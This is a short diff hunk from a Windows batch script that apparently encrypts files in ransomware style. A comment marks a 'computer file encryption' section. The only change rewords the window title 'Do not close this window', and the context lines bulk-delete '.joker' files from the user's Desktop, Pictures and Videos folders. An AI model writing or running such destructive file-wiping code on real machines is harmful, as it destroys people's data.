@@ -271,7 +271,7 @@ exit
 :a                                         
 ::Computer file encryption from line 253 to line 276
 mode con cols=120 lines=30
-title Do not close this window.
+title Don't close this window.
 del %userprofile%\Desktop\*.joker* >nul 2>&1
 del %userprofile%\pictures\*.joker* >nul 2>&1
 del %userprofile%\videos\*.joker* >nul 2>&1
